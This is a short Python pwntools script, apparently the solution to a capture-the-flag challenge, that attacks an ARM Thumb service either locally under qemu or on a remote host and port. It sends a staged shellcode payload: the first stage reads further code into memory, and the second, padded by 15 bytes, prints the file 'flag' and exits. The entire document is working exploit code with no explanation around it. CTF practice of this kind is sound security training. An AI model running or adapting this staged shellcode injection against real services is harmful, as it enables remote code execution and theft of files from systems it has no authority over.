#!/usr/bin/python
from pwn import * #if you don't have this apt install pwntools
from time import sleep
from sys import argv

context.arch = 'thumb'
try:
    if (argv[1] == 'debug'):
        p = process('cd ../src/; /usr/bin/qemu-arm-static -g 9999 ./thumb',shell=True)
    else:
        p = remote(argv[1],int(argv[2]))
    print p.recv(1024)
except KeyboardInterrupt:
    print "Aborted."
except:
    print "Usage: solution.py [debug | <host> <port>]"
    exit()

#stage 1: load more shellcode
stage1 = shellcraft.thumb.linux.syscall('SYS_read', 0, 'r3', 1024)
payload1 = asm(stage1)
p.send(payload1)

#stage 2: read flag to stdout
sleep(1)
stage2 = shellcraft.thumb.linux.cat('flag')+shellcraft.thumb.linux.exit(0) #clean return
#r3 is pc-15 at syscall location for read, so pad
payload2 = 'A'*15+asm(stage2)
p.send(payload2)

print "Flag: "
print p.recv(1024)
